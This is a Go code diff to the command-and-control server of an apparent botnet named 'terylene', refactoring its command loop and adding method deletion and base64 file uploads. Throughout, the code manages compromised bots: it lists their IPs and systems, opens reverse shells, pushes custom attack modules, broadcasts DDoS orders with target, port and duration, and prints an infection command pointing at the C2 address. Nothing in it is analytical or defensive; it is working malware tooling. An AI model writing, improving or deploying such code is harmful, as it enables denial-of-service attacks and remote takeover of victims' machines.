@@ -2,6 +2,7 @@ package main
 
 import (
 	"bufio"
+	"encoding/base64"
 	"errors"
 	"fmt"
 	"io"
@@ -218,7 +219,7 @@ func routerhandle(router *zmq.Socket) {
 				}
 			}
 			if len(msg) == 3 {
-				if shell == true {
+				if shell {
 					var polykey string
 					for _, key := range tera {
 						if msg[0] == key.conn {
@@ -231,9 +232,9 @@ func routerhandle(router *zmq.Socket) {
 						return
 					}
 					if msg[1] == "cmdS" {
-						fmt.Println(fmt.Sprintf("\033[32m%s\033[0m", strings.Trim(string(decoutput), "\n")))
+						fmt.Printf("\033[32m%s\033[0m\n", strings.Trim(string(decoutput), "\n"))
 					} else {
-						fmt.Println(fmt.Sprintf("\x1b[31m%s\x1b[0m", strings.Trim(string(decoutput), "\n")))
+						fmt.Printf("\x1b[31m%s\x1b[0m\n", strings.Trim(string(decoutput), "\n"))
 					}
 				}
 			}
@@ -491,6 +492,11 @@ func uploadmethod(meth Method, pub *zmq.Socket) {
 	filePath := meth.path
 
 	file, err := os.Open(filePath)
+	if err != nil {
+		log.Println(err)
+		return
+	}
+
 	name := meth.name
 	fileInfo, err := os.Stat(filePath)
 	usageformat := []string{fmt.Sprintf("!%s", meth.name)}
@@ -519,7 +525,8 @@ func uploadmethod(meth Method, pub *zmq.Socket) {
 	pub.SendMessage("terylene", "file_start", name, filename)
 	pubmutex.Unlock()
 
-	fmt.Println("upload...")
+	fmt.Println("uploading...")
+
 	for {
 		bytesRead, err := reader.Read(buffer)
 		if err != nil {
@@ -530,8 +537,10 @@ func uploadmethod(meth Method, pub *zmq.Socket) {
 		}
 		chunk := buffer[:bytesRead]
 
+		encodedchunk := base64.StdEncoding.EncodeToString(chunk)
+
 		pubmutex.Lock()
-		pub.SendMessage("terylene", "file_chunk", name, chunk)
+		pub.SendMessage("terylene", "file_chunk", name, encodedchunk)
 		pubmutex.Unlock()
 	}
 
@@ -541,18 +550,18 @@ func uploadmethod(meth Method, pub *zmq.Socket) {
 
 	meth.displayformat = strings.Join(usageformat, " ")
 
-	fmt.Println(meth.displayformat)
-
 	custom_methods = append(custom_methods, meth)
 	fmt.Println("upload finished")
 
 	Allmethods = append(Allmethods, []string{meth.name, meth.description, strings.Join(usageformat, " ")})
-	fmt.Println(Allmethods)
 }
 
 func addmethod(method string, publisher *zmq.Socket) {
 
 	clearScreen()
+
+	fmt.Println(fade.Water(poly.AddmethodArt))
+
 	scanner := bufio.NewScanner(os.Stdin)
 
 	var meth Method
@@ -577,16 +586,21 @@ func addmethod(method string, publisher *zmq.Socket) {
 			return
 		}
 
-		_, err := os.Stat(mpath)
+		fileInfo, err := os.Stat(mpath)
 
 		if err == nil {
+			if fileInfo.IsDir() {
+				color.Red("Path is a directory")
+				continue
+			}
 			meth.path = mpath
 			break
 		} else if os.IsNotExist(err) {
 			color.Red("No such file present")
+			continue
 		} else {
 			log.Printf("fatal error: %s\n", err)
-			return
+			continue
 		}
 	}
 
@@ -631,7 +645,6 @@ func addmethod(method string, publisher *zmq.Socket) {
 		}
 
 		for _, match := range matches {
-			fmt.Println(match)
 
 			if match[1] == "main" {
 				ifmain = true
@@ -659,7 +672,7 @@ func addmethod(method string, publisher *zmq.Socket) {
 			continue
 		}
 
-		if ifmain == false {
+		if !ifmain {
 			color.Red("Format has no main argument")
 			continue
 		}
@@ -667,7 +680,6 @@ func addmethod(method string, publisher *zmq.Socket) {
 		meth.rawformat = format
 		meth.flag_entries = flags
 
-		fmt.Println(meth)
 		break
 	}
 
@@ -694,99 +706,74 @@ func valuecheck(value string, valuetype string) error {
 		if out {
 			return nil
 		} else {
-			return errors.New(fmt.Sprintf("%s is not an ip", value))
+			return fmt.Errorf("%s is not an IP", value)
 		}
 	case "port":
-		num, err := strconv.ParseUint(value, 10, 16)
+		_, err := strconv.ParseUint(value, 10, 16)
 		if err != nil {
-			return errors.New(fmt.Sprintf("%s is not a valid port range", value))
+			return fmt.Errorf("%s is not a valid port range", value)
 		}
-		// Check if the parsed number is within the range of uint8
-		if num >= 0 && num <= 65535 {
-			return nil
-		}
-		return errors.New(fmt.Sprintf("%s is not a valid port range", value))
+
+		return nil
 	case "int":
 		_, err := strconv.ParseInt(value, 10, 64)
 		if err != nil {
-			return errors.New("integer overflow detected")
+			return fmt.Errorf("%s not a valid int64 value", value)
 		}
 		return nil
 	case "uint":
 		_, err := strconv.ParseUint(value, 10, 64)
 		if err != nil {
-			return errors.New("integer overflow detected")
+			return fmt.Errorf("%s not a valid uint64 value", value)
 		}
 		return nil
 	default:
-		return errors.New(fmt.Sprintf("unknown value type: %s", valuetype))
+		return fmt.Errorf("unknown value type: %s", valuetype)
 	}
 }
 
-func methodsendhandler(command string, publisher *zmq.Socket) {
-	parts := strings.Fields(command)
-	if len(parts) > 0 {
-		if strings.HasPrefix(parts[0], "!") {
-			containsBlocked := false
-			//check if the method is builtin
-			for _, value := range config.Methods {
-				if parts[0] == ("!" + value) {
-					for _, block := range config.Blocked {
-						if strings.Contains(command, block) {
-							containsBlocked = true
-						}
-					}
-					if containsBlocked {
-						return
-					}
-
-					if len(parts) == 4 {
-						if !isPublicIPv4(parts[1]) {
-							color.Red("%s is not a public ip", parts[1])
-							continue
-						}
-						_, err := strconv.Atoi(parts[2])
-						if err != nil {
-							color.Red("%s port is not integer", parts[2])
-							continue
-						}
-						_, err = strconv.Atoi(parts[3])
-						if err != nil {
-							color.Red("%s duration is not integer", parts[3])
-							continue
-						}
-						broadcaster([]string{"terylene", command}, publisher)
-						clearScreen()
-						fmt.Println(poly.Ddosmsg)
-						return
-					} else {
-						fmt.Println("!" + fmt.Sprintf("%s <target> <port> <duration>", value))
-						return
-					}
-				}
-			}
-
-			for _, value := range custom_methods {
-				if parts[0] == ("!" + value.name) {
-					for _, block := range config.Blocked {
-						if strings.Contains(command, block) {
-							containsBlocked = true
-						}
-
-						if containsBlocked {
-							return
-						}
-
-						if (len(parts) - 1) != len(value.flag_entries) {
-							fmt.Println(value.displayformat)
-						}
-
-					}
-				}
+func deletemethod(methodName string, publisher *zmq.Socket) error {
+	deleteMethodByName := func(slice []Method, name string) []Method {
+		for i, method := range slice {
+			if method.name == name {
+				return append(slice[:i], slice[i+1:]...)
 			}
 		}
+		return slice
 	}
+
+	deleteFromSlice := func(s [][]string, value string) [][]string {
+		for i, row := range s {
+			if len(row) > 0 && row[0] == value {
+				return append(s[:i], s[i+1:]...)
+			}
+		}
+		return s
+	}
+
+	found := false
+	for _, method := range custom_methods {
+		if method.name == methodName {
+			found = true
+			break
+		}
+	}
+
+	if found {
+		custom_methods = deleteMethodByName(custom_methods, methodName)
+		Allmethods = deleteFromSlice(Allmethods, methodName)
+		pubmutex.Lock()
+		publisher.SendMessage("terylene", "deletemethod", methodName)
+		pubmutex.Unlock()
+	} else {
+		fmt.Println("Custom Method", methodName, "not found", "(NOTE: you cant delete a builtin method or a method that doesnt exist)")
+		return errors.New("method not found")
+	}
+
+	return nil
+
 }
+
 func main() {
 	scanner := bufio.NewScanner(os.Stdin)
 
@@ -822,76 +809,167 @@ func main() {
 			break
 		}
 
-		if strings.Contains(command, "transfer") {
-			fmt.Println(transferprompt(command, router, publisher))
-			continue
-		}
+		parts := strings.Fields(command)
 
-		if strings.Contains(command, "kill") {
-			fmt.Println(killprompt(command, router, publisher))
-		}
-
-		if strings.Contains(command, "shell") {
-			parts := strings.Fields(command)
-			if len(parts) != 2 {
-				fmt.Println(poly.Shellhelp)
+		if len(parts) >= 1 {
+			switch parts[0] {
+			case "transfer":
+				fmt.Println(transferprompt(command, router, publisher))
 				continue
+			case "kill":
+				fmt.Println(killprompt(command, router, publisher))
+			case "shell":
+				if len(parts) != 2 {
+					fmt.Println(poly.Shellhelp)
+					continue
+				}
+
+				reversehandler(parts[1], scanner, router)
+			case "addmethod":
+				if len(parts) != 2 {
+					color.Red(poly.AddmethodHelp)
+					continue
+				}
+				addmethod(parts[1], publisher)
+			case "deletemethod":
+				if len(parts) != 2 {
+					color.Red(poly.DeletemethodHelp)
+					continue
+				}
+				deletemethod(parts[1], publisher)
+			case "help":
+				fmt.Print(strings.TrimLeft(poly.Help, "\n"))
+			case "clear":
+				clearScreen()
+			case "exit":
+				publisher.Close()
+				color.Red("[✔] successfully shutdown broadcast")
+				router.Close()
+				color.Red("[✔] successfully shutdown router")
+				os.Exit(1)
+			case "methods":
+				table := tablewriter.NewWriter(os.Stdout)
+				table.SetHeader([]string{"Methods", "descriptions", "formats"})
+
+				table.SetHeaderColor(
+					tablewriter.Colors{tablewriter.FgHiCyanColor, tablewriter.BgMagentaColor},
+					tablewriter.Colors{tablewriter.FgHiCyanColor, tablewriter.BgMagentaColor},
+					tablewriter.Colors{tablewriter.FgHiCyanColor, tablewriter.BgMagentaColor},
+				)
+
+				for _, v := range Allmethods {
+					table.Append(v)
+				}
+				table.Render() // Send output
+			case "list":
+				fmt.Println("Number of bots:", len(aliveclient))
+				if len(aliveclient) != 0 {
+					for _, bot := range tera {
+						fmt.Printf("Bot ID: %s \narch: %s\nOS: %s\npublic ip: %s\nlocal ip: %s\n", bot.connID, bot.arch, bot.OS, bot.pubip, bot.localip)
+					}
+				}
+			case "payload":
+				fmt.Println("terylene payload:")
+				if config.C2ip == "0.0.0.0" {
+					newC2ip := getpubIp()
+					fmt.Println(fmt.Sprintf(config.Infcommand, newC2ip))
+					continue
+				}
+				fmt.Println(fmt.Sprintf(config.Infcommand, config.C2ip))
+			default:
+				methodsendhandler(command, publisher)
 			}
-			reversehandler(parts[1], scanner, router)
 		}
 
-		if strings.Contains(command, "addmethod") {
-			parts := strings.Fields(command)
+	}
+}
 
-			if len(parts) != 2 {
-				color.Red(poly.AddmethodHelp)
-				continue
-			}
-			addmethod(parts[1], publisher)
-		}
+func methodsendhandler(command string, publisher *zmq.Socket) {
+	parts := strings.Fields(command)
+	if len(parts) > 0 {
+		if strings.HasPrefix(parts[0], "!") {
+			containsBlocked := false
+			//check if the method is builtin
+			for _, value := range config.Methods {
+				if parts[0] == ("!" + value) {
+					for _, block := range config.Blocked {
+						if strings.Contains(command, block) {
+							containsBlocked = true
+						}
+					}
+					if containsBlocked {
+						return
+					}
 
-		switch command {
-		case "help":
-			fmt.Printf(strings.TrimLeft(poly.Help, "\n"))
-		case "clear":
-			clearScreen()
-		case "exit":
-			publisher.Close()
-			color.Red("[✔] successfully shutdown broadcast")
-			router.Close()
-			color.Red("[✔] successfully shutdown router")
-			os.Exit(1)
-		case "methods":
-			table := tablewriter.NewWriter(os.Stdout)
-			table.SetHeader([]string{"Methods", "descriptions", "formats"})
+					if len(parts) == 4 {
+						query := []string{"terylene"}
 
-			table.SetHeaderColor(
-				tablewriter.Colors{tablewriter.FgHiCyanColor, tablewriter.BgMagentaColor},
-				tablewriter.Colors{tablewriter.FgHiCyanColor, tablewriter.BgMagentaColor},
-				tablewriter.Colors{tablewriter.FgHiCyanColor, tablewriter.BgMagentaColor},
-			)
+						if !isPublicIPv4(parts[1]) {
+							color.Red("%s is not a public ip", parts[1])
+							continue
+						}
+						query = append(query, parts[1])
 
-			for _, v := range Allmethods {
-				table.Append(v)
-			}
-			table.Render() // Send output
-		case "list":
-			fmt.Println("Number of bots:", len(aliveclient))
-			if len(aliveclient) != 0 {
-				for _, bot := range tera {
-					fmt.Printf("Bot ID: %s \narch: %s\nOS: %s\npublic ip: %s\nlocal ip: %s\n", bot.connID, bot.arch, bot.OS, bot.pubip, bot.localip)
+						_, err := strconv.Atoi(parts[2])
+						if err != nil {
+							color.Red("%s port is not integer", parts[2])
+							continue
+						}
+						query = append(query, parts[2])
+
+						_, err = strconv.Atoi(parts[3])
+						if err != nil {
+							color.Red("%s duration is not integer", parts[3])
+							continue
+						}
+
+						query = append(query, parts[3])
+
+						broadcaster(query, publisher)
+						clearScreen()
+						fmt.Println(poly.Ddosmsg)
+						return
+					} else {
+						fmt.Println("!" + fmt.Sprintf("%s <target> <port> <duration>", value))
+						return
+					}
 				}
 			}
-		case "payload":
-			fmt.Println("terylene payload:")
-			if config.C2ip == "0.0.0.0" {
-				newC2ip := getpubIp()
-				fmt.Println(fmt.Sprintf(config.Infcommand, newC2ip))
-				continue
+
+			for _, value := range custom_methods {
+				if parts[0] == ("!" + value.name) {
+					for _, block := range config.Blocked {
+						if strings.Contains(command, block) {
+							containsBlocked = true
+						}
+					}
+
+					if containsBlocked {
+						return
+					}
+
+					if (len(parts) - 1) != len(value.flag_entries) {
+						fmt.Println(value.displayformat)
+						return
+					}
+					query := []string{"terylene", value.name}
+
+					for i, value := range value.flag_entries {
+						err := valuecheck(parts[i+1], value.entrytype)
+
+						if err != nil {
+							color.Red(fmt.Sprintf("%v", err))
+							return
+						}
+						query = append(query, parts[i+1])
+					}
+
+					broadcaster(query, publisher)
+
+					fmt.Println(poly.Ddosmsg)
+					break
+				}
 			}
-			fmt.Println(fmt.Sprintf(config.Infcommand, config.C2ip))
-		default:
-			methodsendhandler(command, publisher)
 		}
 	}
 }
